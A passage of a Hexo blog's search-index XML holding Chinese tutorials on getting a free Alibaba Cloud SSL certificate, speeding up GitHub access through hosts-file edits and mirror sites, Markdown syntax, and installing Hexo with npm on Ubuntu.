align="center">:heavy_check_mark:</td></tr><tr><td align="center"><code>:ballot_box_with_check:</code></td><td align="center">:ballot_box_with_check:</td><td align="center"><code>:radio_button:</code></td><td align="center">:radio_button:</td><td align="center"><code>:link:</code></td><td align="center">:link:</td></tr><tr><td align="center"><code>:curly_loop:</code></td><td align="center">:curly_loop:</td><td align="center"><code>:wavy_dash:</code></td><td align="center">:wavy_dash:</td><td align="center"><code>:part_alternation_mark:</code></td><td align="center">:part_alternation_mark:</td></tr><tr><td align="center"><code>:trident:</code></td><td align="center">:trident:</td><td align="center"><code>:black_large_square:</code></td><td align="center">:black_large_square:</td><td align="center"><code>:white_large_square:</code></td><td align="center">:white_large_square:</td></tr><tr><td align="center"><code>:white_check_mark:</code></td><td align="center">:white_check_mark:</td><td align="center"><code>:white_square_button:</code></td><td align="center">:white_square_button:</td><td align="center"><code>:black_square_button:</code></td><td align="center">:black_square_button:</td></tr><tr><td align="center"><code>:black_circle:</code></td><td align="center">:black_circle:</td><td align="center"><code>:white_circle:</code></td><td align="center">:white_circle:</td><td align="center"><code>:red_circle:</code></td><td align="center">:red_circle:</td></tr><tr><td align="center"><code>:large_blue_circle:</code></td><td align="center">:large_blue_circle:</td><td align="center"><code>:large_blue_diamond:</code></td><td align="center">:large_blue_diamond:</td><td align="center"><code>:large_orange_diamond:</code></td><td align="center">:large_orange_diamond:</td></tr><tr><td align="center"><code>:small_blue_diamond:</code></td><td align="center">:small_blue_diamond:</td><td align="center"><code>:small_orange_diamond:</code></td><td align="center">:small_orange_diamond:</td><td align="center"><code>:small_red_triangle:</code></td><td align="center">:small_red_triangle:</td></tr><tr><td align="center"><code>:small_red_triangle_down:</code></td><td align="center">:small_red_triangle_down:</td><td align="center"><code>:shipit:</code></td><td align="center">:shipit:</td><td align="center"></td><td align="center"></td></tr></tbody></table><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阿里云免费注册HTTP SSL证书</title>
      <link href="/posts/6003.html"/>
      <url>/posts/6003.html</url>
      
        <content type="html"><![CDATA[<h2 id="阿里云免费HTTP-SSL证书注册"><a href="#阿里云免费HTTP-SSL证书注册" class="headerlink" title="阿里云免费HTTP SSL证书注册"></a>阿里云免费<code>HTTP SSL</code>证书注册</h2><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10170.png" alt="10170"></p><h3 id="导读"><a href="#导读" class="headerlink" title="导读"></a>导读</h3><blockquote><p><strong>HTTP</strong>(<code>HyperText Transfer Protocol</code>：超文本传输协议)是一种用于分布式,协作式和超媒体信息系统的应用层协议.简单来说就是一种发布和接收 HTML 页面的方法,被用于在 Web 浏览器和网站服务器之间传递信息.</p><p>HTTP 默认工作在 TCP 协议 80 端口,用户访问网站 <strong>http://</strong> 打头的都是标准 HTTP 服务.</p><p>HTTP 协议以明文方式发送内容,不提供任何方式的数据加密,如果攻击者截取了Web浏览器和网站服务器之间的传输报文,就可以直接读懂其中的信息,因此,HTTP协议不适合传输一些敏感信息,比如:信用卡号,密码等支付信息.</p><p><strong>HTTPS</strong><code>Hypertext Transfer Protocol Secure</code>:超文本传输安全协议)是一种透过计算机网络进行安全通信的传输协议.HTTPS 经由 HTTP 进行通信,但利用 SSL/TLS 来加密数据包.HTTPS 开发的主要目的,是提供对网站服务器的身份认证,保护交换数据的隐私与完整性.</p><p>HTTPS 默认工作在 TCP 协议443端口,它的工作流程一般如以下方式:</p><ul><li>1.TCP 三次同步握手</li><li>2.客户端验证服务器数字证书</li><li>3.DH 算法协商对称加密算法的密钥、hash 算法的密钥</li><li>4.SSL 安全加密隧道协商完成</li><li>5.网页以加密的方式传输,用协商的对称加密算法和密钥加密,保证数据机密性;用协商的hash算法进行数据完整性保护,保证数据不被篡改.</li></ul><p>可以说,<code>HTTPS</code>已经是网络发展的趋势.</p></blockquote><h3 id="阿里云购买免费HTTPS-SSL"><a href="#阿里云购买免费HTTPS-SSL" class="headerlink" title="阿里云购买免费HTTPS SSL"></a>阿里云购买免费<code>HTTPS SSL</code></h3><blockquote><ol><li>登录阿里云</li><li>访问<code>SSL</code>证书<a href="https://www.aliyun.com/product/cas?source=5176.11533457&userCode=ywqc0ubl&type=copy" target="_blank" rel="noopener">页面</a></li><li>点击证书对比,然后点击免费证书购买</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10157.png" alt="10157"></p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10158.png" alt="10158"></p><ol start="4"><li>选中<code>DV SSL</code>,然后立即购买.</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10159.png" alt="10159"></p></blockquote><h3 id="申请证书"><a href="#申请证书" class="headerlink" title="申请证书"></a>申请证书</h3><blockquote><ol><li>打开阿里云的控制台<code>https://homenew.console.aliyun.com/</code></li><li>找到<code>ssl证书</code></li></ol><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10160.png" alt="10160"></p><ol start="3"><li>点击证书申请</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10161.png" alt="10161"></p><ol start="4"><li>填写相关信息</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10162.png" alt="10162"></p><ol start="5"><li>等待电话或者邮件的复核.</li></ol></blockquote><h3 id="等待…"><a href="#等待…" class="headerlink" title="等待…."></a>等待….</h3><blockquote><p>今天<code>2020-8-12</code>,应该等待2个工作日,结果会下来.结果下来会再次更新.</p></blockquote><h3 id="申请成功"><a href="#申请成功" class="headerlink" title="申请成功"></a>申请成功</h3><blockquote><p>今天阿里云通知我<code>SSL</code>证书申请成功.</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10165.png" alt="shadow"></p><p>因为申请是就是<code>www.wenyan.online</code>,而且是跳转到<code>github</code>网站,所以以上就可以.</p></blockquote><h3 id="访问网站"><a href="#访问网站" class="headerlink" title="访问网站"></a>访问网站</h3><blockquote><p>如果访问<code>http://wenyan.online/</code>,依然是可以访问到网站的,原因就是他不是自动跳转<code>https</code>的.<br><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10166.png" alt="10166"></p><p>(可以看到有不安全的提示)</p><p>现在我们设置强制<code>https</code>访问.</p><ol><li>访问<code>github page</code>项目,打开<code>setting</code></li></ol><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10167.png" alt="10167"></p><ol start="2"><li>找到<code>enforce https</code>,确定强制跳转</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10168.png" alt="10168"></p><ol start="3"><li>再次访问<code>wenyan.online</code>,会自动跳转到<code>https://wenyan.online</code></li></ol><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10169.png" alt="10169"></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> 阿里云 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github加速下载</title>
      <link href="/posts/10894.html"/>
      <url>/posts/10894.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/github.png" alt="github"></p><h2 id="Github加速访问和下载"><a href="#Github加速访问和下载" class="headerlink" title="Github加速访问和下载"></a><code>Github</code>加速访问和下载</h2><h3 id="导读"><a href="#导读" class="headerlink" title="导读"></a>导读</h3><blockquote><p>前几天,我们讲解了如何自建一个<code>Hexo</code>博客,在搭建的过程中,就感受到了<code>Github</code> 的访问速度非常慢,而且<code>git clone</code>项目半天下载不下来了.今天就总结几个明显提高速度的方法.</p></blockquote><h3 id="Github提升访问速度"><a href="#Github提升访问速度" class="headerlink" title="Github提升访问速度"></a><code>Github</code>提升访问速度</h3><blockquote><p>由于不可预知的原因,<code>Github</code>的<code>DNS</code>被污染,所有这里使用修改本机<code>hosts</code>文件的方法,修正其<code>DNS</code>地址.</p></blockquote><h4 id="1-获取Github地址"><a href="#1-获取Github地址" class="headerlink" title="1.获取Github地址"></a>1.获取<code>Github</code>地址</h4><blockquote><p>访问<code>https://www.ipaddress.com/</code>查询以下链接的<code>DNS</code>地址</p><pre class="line-numbers language-bash"><code class="language-bash">github.comassets-cdn.github.comgithub.global.ssl.fastly.net<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>并打开命令行手动<code>ping</code>哪个地址对自己的延迟最小,然后记录下来(注意根据自己的实际情况来)</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10150.png" alt="10150"></p></blockquote><h4 id="2-更新地址"><a href="#2-更新地址" class="headerlink" title="2.更新地址"></a>2.更新地址</h4><blockquote><p><code>windows</code> :打开<code>C:\Windows\System32\drivers\etc\hosts</code>文件,并添加上面的地址和<code>ip</code>对应.</p><p><code>ubuntu</code>:<code>/etc/hosts</code>文件,添加并修改</p></blockquote><h4 id="3-刷新缓存"><a href="#3-刷新缓存" class="headerlink" title="3.刷新缓存"></a>3.刷新缓存</h4><blockquote><p><code>windows</code>:打开命令行<code>cmd</code>工具,并输入<code>ipcofnig /flushdns</code></p><p><code>ubuntu</code>:打开<code>terminal</code>,并输入<code>service network restart</code></p></blockquote><h3 id="Github提上下载速度"><a href="#Github提上下载速度" class="headerlink" title="Github提上下载速度"></a><code>Github</code>提上下载速度</h3><blockquote><p>解决项目下载慢问题.</p></blockquote><h4 id="1-使用加速插件"><a href="#1-使用加速插件" class="headerlink" title="1.使用加速插件"></a>1.使用加速插件</h4><blockquote><p>使用<code>chrome</code>插件加速.<br><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10151.png" alt="10151"></p><p>如果你不能科学上网,请尝试访问我的插件盘￼点.</p>> ><div style="position:relative;width:100%;height:0;padding-bottom:75%">> <iframe src="//player.bilibili.com/player.html?aid=328695603&bvid=BV1qA411i7aC&cid=208780563&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;>></div>><p>访问效果如下:</p><p><img src=" https: cdn.jsdelivr.net gh ningwenyan my_chat_picgo 10152.png" alt="10152"><p></p></iframe></div></blockquote><h4 id="2-gitclone"><a href="#2-gitclone" class="headerlink" title="2.gitclone"></a>2.<code>gitclone</code></h4><blockquote><p>上面也提供了<code>ssh</code>的方法,这里再提供一个命令行的加速工具<code>gitlcone</code></p><p>官网:<code>https://gitclone.com/</code></p><p>使用非常简单,只需要在要下载的资源钱加<code>gitclone</code>就行.具体的可以看官网的介绍<code>https://gitclone.com/docs/feature</code></p></blockquote><h4 id="3-一些github代下载网站"><a href="#3-一些github代下载网站" class="headerlink" title="3.一些github代下载网站"></a>3.一些<code>github</code>代下载网站</h4><blockquote><p>比如:</p><ul><li><code>http://g.widyun.com/</code></li><li><code>https://www.toolnb.com/</code></li></ul><p>等等.</p><p>我觉得以上应该基本满足应用了.</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MarkDown初探</title>
      <link href="/posts/28178.html"/>
      <url>/posts/28178.html</url>
      
        <content type="html"><![CDATA[<h2 id="Markdown初探"><a href="#Markdown初探" class="headerlink" title="Markdown初探"></a><code>Markdown</code>初探</h2><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10148.png" alt="10148"></p><h3 id="导读"><a href="#导读" class="headerlink" title="导读"></a>导读</h3><blockquote><p>前面已经介绍了如何生成一个<code>Hexo</code> 博客,也简单的介绍了写博客使用的工具<code>Typora</code> .</p><p>那什么是<code>Typora</code> ?它是一个所见即所得的<code>markdown</code>工具.</p><p>那什么是<code>markdown</code>?它的基本语法是什么?这是下面我们主要介绍的.</p></blockquote><h3 id="什么是markdown"><a href="#什么是markdown" class="headerlink" title="什么是markdown"></a>什么是<code>markdown</code></h3><blockquote><p><strong>Markdown</strong> 是目前互联网上最流行的写作语言，它使用一些简单的符号（* / ` &gt; [] () #）来标记文本格式，其简洁的语法、优美的格式以及强大的软件支持深受广大网友的喜爱。</p><p>维基百科上对 Markdown 的描述：</p><p><strong>Markdown</strong> 是一种<strong>轻量级</strong>标记语言，创始人是<strong>约翰·格鲁伯</strong>（John Gruber）。它允许人们 “使用易读易写的纯文本格式编写文档，然后转换成有效的 HTML 文档。”</p><p>大家千万不要被一些专业术语唬住了，其实 <strong>Markdown</strong> 之所以流行，最主要的原因就是因为它的学习门槛很低，你可能只需花几分钟就可以入门了。</p></blockquote><h3 id="如何写markdown"><a href="#如何写markdown" class="headerlink" title="如何写markdown"></a>如何写<code>markdown</code></h3><blockquote><p>在练习写<code>markdown</code>之前,我建议你下载一个<code>typora</code> ,因为他所见即所得,你可以一边写一边对照源码.当然了市面上也存在着很多的<code>markdown</code>编辑器.这个看个人的喜好,可以自己去尝试其他的编辑器.</p><p><code>typora</code>:<a href="https://typora.io/" target="_blank" rel="noopener">https://typora.io/</a></p><p>注意:<code>markdown</code>文件都是以<code>.md</code> 结尾的.可以下载语法文件<code>(https://github.com/ningwenyan/MyNote/blob/master/MarkDown初探.md)</code>,对照练习.</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10149.png" alt="10149"></p></blockquote><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><blockquote><p>使用该文件测试和展示<code>Github</code>的markdown语法。<br><code>Github</code>的<code>markdown</code>语法在标准的语法上做了补充,称为<code>Github Flavored Markdown</code>.简称GFM,GFM在<code>Github</code>上有广泛的应用,除了README文件,issues和wiki都支持markdown语法.</p></blockquote><hr><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><hr><hr><hr><p><code>***,---,___</code>都用来表示分割线</p><table><thead><tr><th>语法</th><th>使用</th><th>效果</th></tr></thead><tbody><tr><td><code>***,---,___</code></td><td>分割线(用在一行开头)</td><td></td></tr><tr><td><code>#</code></td><td>一级标题</td><td><a href="#%E6%A0%87%E9%A2%98">标题</a></td></tr><tr><td><code>##</code></td><td>二级标题</td><td><a href="#%E6%A0%87%E9%A2%98">标题</a></td></tr><tr><td><code>###</code></td><td>三级标题</td><td><a href="#%E6%A0%87%E9%A2%98">标题</a></td></tr><tr><td><code>####</code></td><td>四级标题</td><td><a href="#%E6%A0%87%E9%A2%98">标题</a></td></tr><tr><td><code>#####</code></td><td>五级标题</td><td><a href="#%E6%A0%87%E9%A2%98">标题</a></td></tr><tr><td><code>######</code></td><td>六级标题</td><td><a href="#%E6%A0%87%E9%A2%98">标题</a></td></tr><tr><td>普通文本</td><td>直接输入</td><td><a href="#%E6%99%AE%E9%80%9A%E6%96%87%E6%9C%AC">普通文本</a></td></tr><tr><td>单行文本</td><td>在一行的开头就一个tab<br>或者4个空格</td><td><a href="#%E5%8D%95%E8%A1%8C%E6%96%87%E6%9C%AC">单行文本</a></td></tr><tr><td>文本块</td><td>语法一:在连续几行的文本开头加tab或4个空格<br>语法二:使用一对各三个的反引号</td><td><a href="%E6%96%87%E6%9C%AC%E5%9D%97">文本块</a></td></tr><tr><td>文本高亮</td><td>使用一对反引号</td><td><code>linux</code> <code>学习</code></td></tr><tr><td>换行</td><td>直接回车不能换行,可以在两行文本之间补一个空行<br>使用换行符<code>&lt;br&gt;</code></td><td>a<br><code>br</code></td></tr><tr><td><code>*斜体1*</code></td><td><em>斜体1</em></td><td></td></tr><tr><td><code>_斜体2_</code></td><td><em>斜体2</em></td><td></td></tr><tr><td><code>**粗体1**</code></td><td><strong>粗体1</strong></td><td></td></tr><tr><td><code>__粗体2__</code></td><td><strong>粗体2</strong></td><td></td></tr><tr><td><code>这是一个 ~~删除线~~</code></td><td>这是一个 <del>删除线</del></td><td></td></tr><tr><td><code>***斜粗体1***</code></td><td><strong><em>斜粗体1</em></strong></td><td></td></tr><tr><td><code>___斜粗体2___</code></td><td><strong><em>斜粗体2</em></strong></td><td></td></tr><tr><td><code>***~~斜粗体删除线1~~***</code></td><td><strong><em><del>斜粗体删除线1</del></em></strong></td><td></td></tr><tr><td><code>~~***斜粗体删除线2***~~</code></td><td><del><strong><em>斜粗体删除线2</em></strong></del></td><td></td></tr><tr><td><code>斜体,粗体,删除线可以直接混合使用</code></td><td></td><td></td></tr><tr><td><code>![alt](URL title)</code></td><td><code>alt</code>:显示图片失败时显示的文本<br><code>URL title</code>:<br><code>URL</code>:图片的URL地址,如果是仓库中的图片,<br>直接使用相对路径就可以了,如果是其他仓库中的图片要注意格式,<code>仓库地址/raw/分支名/图片路径</code><br><code>title</code>:鼠标停留在图片上时显示的文字</td><td><code>![google](https://www.google.com/</code><br><code>images/logo.gif &quot;goolge&quot;)</code><br><img src="https://www.google.com/images/logo.gif" alt="google" title="google"></td></tr><tr><td>链接</td><td>链接外部URL <code>[alt](URL title)</code><br><code>alt</code>是显示在屏幕上的连接名</td><td><code>[谷歌](www.google.com)</code><br><a href="https://www.google.com/" target="_blank" rel="noopener">谷歌</a></td></tr><tr><td>锚点</td><td>其实每个标题都是一个锚点，和THML的锚点<code>#</code>类似<br><code>[create an anchor](#anchors-in-markdown)</code></td><td>比如最上面定义了一个目录可以<a href="#%E7%9B%AE%E5%BD%95">回到目录</a><br>定义为:<code>[回到目录](#目录)</code> <a href="%E9%94%9A%E7%82%B9">详细介绍</a></td></tr><tr><td>有序列表</td><td><a href="#%E6%9C%89%E5%BA%8F%E5%88%97%E8%A1%A8">详细效果</a></td><td></td></tr><tr><td>多级有序列表</td><td><a href="#%E5%A4%9A%E7%BA%A7%E6%9C%89%E5%BA%8F%E5%88%97%E8%A1%A8">详细效果</a></td><td></td></tr><tr><td>无序列表</td><td>使用<code>+,*,-</code>都可以表示</td><td><a href="#%E6%9C%89%E5%BA%8F%E5%88%97%E8%A1%A8">详细效果</a></td></tr><tr><td>复选框列表</td><td></td><td><a href="#%E5%A4%8D%E9%80%89%E6%A1%86">详细效果</a></td></tr><tr><td>表格</td><td></td><td></td></tr><tr><td>多级表格</td><td></td><td><a href="%E5%A4%9A%E7%BA%A7%E8%A1%A8%E6%A0%BC">多级表格</a></td></tr><tr><td>diff语法</td><td>与代码高亮类似,替换代码类型为diff即可</td><td><a href="#diff%E8%AF%AD%E6%B3%95">diff语法</a></td></tr><tr><td>表情</td><td>GFM支持出入表情</td><td>输入不同的冒号符(两个冒号包围的字符)可以显示出不同的表情<br><a href="http://www.emoi-cheat-sheet.com/" target="_blank" rel="noopener">官方查询</a><br></td></tr></tbody></table><hr><h4 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h4><h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4><h5 id="五级标题"><a href="#五级标题" class="headerlink" title="五级标题"></a>五级标题</h5><h6 id="六级标题"><a href="#六级标题" class="headerlink" title="六级标题"></a>六级标题</h6><hr><h4 id="普通文本"><a href="#普通文本" class="headerlink" title="普通文本"></a>普通文本</h4><p>普通文本</p><hr><h4 id="单行文本"><a href="#单行文本" class="headerlink" title="单行文本"></a>单行文本</h4><blockquote><p>(在一行的开头加一个tab或者是4个空格)<br>hello world</p></blockquote><pre><code>文本块文本块文本块</code></pre><hr><h4 id="文本块"><a href="#文本块" class="headerlink" title="文本块"></a>文本块</h4><pre><code>文本块文本块文本块</code></pre><h4 id="锚点"><a href="#锚点" class="headerlink" title="锚点"></a>锚点</h4><p><a href="https://www.zhihu.com/" target="_blank" rel="noopener">https://www.zhihu.com/</a></p><pre><code>功能/语法：    1. It downcases the string    2. remove anything that is not a letter, number, space or hyphen (see the source for how Unicode is handled)    3. changes any space to a hyphen.    4. If that is not unique, add &quot;-1&quot;, &quot;-2&quot;, &quot;-3&quot;,... to make it unique如上所示，对于标题为#What is LaTeX?正确的链接方式是[What is LaTeX?](#what-is-latex)同理：[Ready, set, GO!](#ready-set-go)使用这样的方式就可以实现Markdown的目录了。</code></pre><hr><h4 id="多级表格"><a href="#多级表格" class="headerlink" title="多级表格"></a>多级表格</h4><p>第一步：从word或excel中复制表格<br>第二步：打开此<a href="http://pressbin.com/tools/excel_to_html_table/index.html" target="_blank" rel="noopener">链接</a><br>第三步：贴上复制的文字,然后按convert，就会得到这个表格的代码：<br>第四步: 将代码粘贴到markdown中就可以显示出来</p><hr><h4 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h4><p>格式为<code>数字+ 英文符号. +空格 +名称</code>来表示<br>注意<code>.</code> 后面的空格</p><ol><li>第一</li><li>第二</li><li>第三</li></ol><h4 id="多级有序列表"><a href="#多级有序列表" class="headerlink" title="多级有序列表"></a>多级有序列表</h4><p>相同与有序列表,只要错开即可<br>注意<code>.</code> 后面的空格</p><ol><li>第一<ol><li>第二<ol><li>第三</li></ol></li></ol></li></ol><h4 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h4><p>注意空格分隔开</p><pre><code>+ 1+ 2+ 3 - 1- 2* 1 * 2</code></pre><ul><li><p>1</p></li><li><p>2</p></li><li><p>3</p></li><li><p>1</p></li><li><p>2</p></li><li><p>1</p></li><li><p>2</p></li></ul><h4 id="复选框"><a href="#复选框" class="headerlink" title="复选框"></a>复选框</h4><ul><li><input checked disabled type="checkbox"> 1</li><li><input checked disabled type="checkbox"> 2</li><li><input disabled type="checkbox"> 3</li></ul><pre><code>注意空格隔开- [x] 1- [x] 2- [ ] 3</code></pre><h4 id="diff语法"><a href="#diff语法" class="headerlink" title="diff语法"></a>diff语法</h4><p>GFM中可以 显示 diff效果，绿色表示新增，红色表示删除</p><pre class="line-numbers language-diff"><code class="language-diff"><span class="token inserted">+  新增加</span><span class="token deleted">-  新删除</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo博客搭建</title>
      <link href="/posts/31415.html"/>
      <url>/posts/31415.html</url>
      
        <content type="html"><![CDATA[<h1 id="Hexo-Blog"><a href="#Hexo-Blog" class="headerlink" title="Hexo Blog"></a><code>Hexo Blog</code></h1><p><img src="https://ftp.bmp.ovh/imgs/2020/08/07c7f70fdae11fb8.png"></p><h2 id="初识Hexo"><a href="#初识Hexo" class="headerlink" title="初识Hexo"></a>初识<code>Hexo</code></h2><h3 id="1-Hexo"><a href="#1-Hexo" class="headerlink" title="1.Hexo"></a>1.<code>Hexo</code></h3><blockquote><p><a href="https://hexo.io/zh-cn/index.html" target="_blank" rel="noopener">官网</a></p><p>使用<code>ubuntu</code> 安装一个博客系统,使用的是<code>Hexo</code>静态博客.</p><p><code>Hexo</code> 是一个快速,简洁且高效的博客框架.支持<code>markdown</code>,易于操作.</p></blockquote><h3 id="2-安装"><a href="#2-安装" class="headerlink" title="2.安装"></a>2.安装</h3><blockquote><p>首先<code>hexo</code>系统需要安装<code>Git\npm\nodejs</code>支持.</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 本机,因为本机已经安装过了,这里使用虚拟机演示</span>❯ lsb_release -aNo LSB modules are available.Distributor ID:    UbuntuDescription:    Ubuntu 18.04.4 LTSRelease:    18.04Codename:    bionic<span class="token comment" spellcheck="true"># 虚拟机</span>$ lsb_release -aDistributor ID:    DeepinDescription:    Deepin 20 BetaRelease:    20 BetaCodename:    n/a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>安装:</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">apt-get</span> isntall nodejs-legacy$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token function">npm</span>$ <span class="token function">sudo</span> apt <span class="token function">install</span> <span class="token function">git</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>查看当前版本:</p><pre class="line-numbers language-bash"><code class="language-bash">$ node -v$ <span class="token function">npm</span> -v<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>修改<code>npm</code>源,提供下载速度</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">npm</span> config <span class="token keyword">set</span> registry https://registry.npm.taobao.org<span class="token comment" spellcheck="true"># 如果不能执行,直接升级node版本</span>$ <span class="token function">sudo</span> <span class="token function">npm</span> config list　<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>升级<code>npm</code>为最新版</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">npm</span> <span class="token function">install</span> npm@latest -g<span class="token comment" spellcheck="true"># 升级完毕后,直接退出终端再打开,刷新一下终端环境</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>安装用于管理<code>node</code>的模块<code>n</code></p><pre class="line-numbers language-bash">$ sudo npm install -g n</code></pre><p>使用<code>n</code>模块来安装<code>node</code> 版本</p><pre><code class="bash"><code class="language-bash">$ sudo npm install -g n</code></pre><p>使用<code>n</code>模块来安装<code>node</code> 版本</p><pre><code class="bash"># sudo n latest         # 最新版本# sudo n stable         # 最新稳定版本,如果不能安装,则升级最新版本# sudo n lts            # 长期支持版本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>安装完毕后,查看版本</p><pre class="line-numbers language-bash"><code class="language-bash">❯ node -vv14.7.0❯ <span class="token function">npm</span> -v6.14.7❯ <span class="token function">git</span> --version<span class="token function">git</span> version 2.17.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>安装<code>hexo</code></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 创建一个blog根目录</span>❯ <span class="token function">mkdir</span> myblog❯ <span class="token function">cd</span> myblog❯  <span class="token function">pwd</span>/home/kning/myblog<span class="token comment" spellcheck="true"># 安装hexo</span>❯ <span class="token function">sudo</span> <span class="token function">npm</span> <span class="token function">install</span> -g hexo-cli<span class="token comment" spellcheck="true"># 验证</span>❯ hexo -vhexo-cli: 4.1.0os: Linux 5.3.0-62-generic linux x64node: 14.7.0v8: 8.4.371.19-node.12uv: 1.38.1zlib: 1.2.11brotli: 1.0.7ares: 1.16.0modules: 83nghttp2: 1.41.0napi: 6llhttp: 2.0.4openssl: 1.1.1gcldr: 37.0icu: 67.1tz: 2020aunicode: 13.0<span class="token comment" spellcheck="true"># 初始化文件夹</span>❯ <span class="token function">sudo</span> hexo init<span class="token comment" spellcheck="true"># 安装插件</span>❯ <span class="token function">sudo</span>  <span class="token function">npm</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>新建完成后,文件目录如下:</p><pre class="line-numbers 